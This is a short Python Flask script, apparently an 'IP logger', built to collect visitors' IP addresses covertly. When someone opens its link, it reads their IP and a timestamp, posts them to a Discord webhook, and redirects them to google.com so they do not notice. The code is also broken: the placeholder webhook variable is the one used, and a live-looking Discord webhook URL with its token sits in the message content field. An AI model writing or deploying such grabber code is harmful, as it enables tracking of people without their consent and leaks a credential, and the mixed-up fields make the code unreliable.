from flask import Flask, request, redirect
from datetime import datetime
import requests


app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "WEBHOOK_URL_HERE"
    data = {
        "content": "https://discord.com/api/webhooks/1389671364117397594/jQhf499StnTMzV3J0s2suuI3_S6D7eHi40UNWJx4dY5eC8oSHUke0657sXN7cWB6Vmnr",
        "title": "IP Logger"
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": date
         }
    ]
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")

    send_ip(ip, date)

    return redirect("https://google.com")



if __name__ == "__main__":
    app.run(host='0.0.0.0')
